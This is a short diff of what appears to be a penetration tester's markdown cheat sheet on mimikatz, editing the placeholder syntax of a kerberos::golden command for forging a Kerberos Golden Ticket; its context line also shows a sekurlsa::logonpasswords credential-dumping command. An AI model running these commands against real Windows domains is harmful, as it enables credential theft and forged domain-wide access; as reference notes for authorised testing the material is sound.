@@ -24,7 +24,7 @@ mimikatz "log" "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "e
 # kerberos
 ## Make a Golden ticket
 ```console
-kerberos::golden /user:<username> /domain:<domain> /sid:<sid> /aes256:<aes256_hmac> /id:<user_id> /groups:<group_id> /startoffset:0 /endin:600 /renewmax:10080 /ticket:<user.domain.kirbi>
+kerberos::golden /user:domain\<username> /domain:<domain>.local /sid:<sid> /aes256:<aes256_hmac> /id:<user_id> /groups:<group_id> /startoffset:0 /endin:600 /renewmax:10080 /ticket:<user.domain.kirbi>
 ```
 
 SID can be found by [wmic](https://github.com/okazymyrov/piki/blob/master/wmic.md#get-sids-of-domains) or 
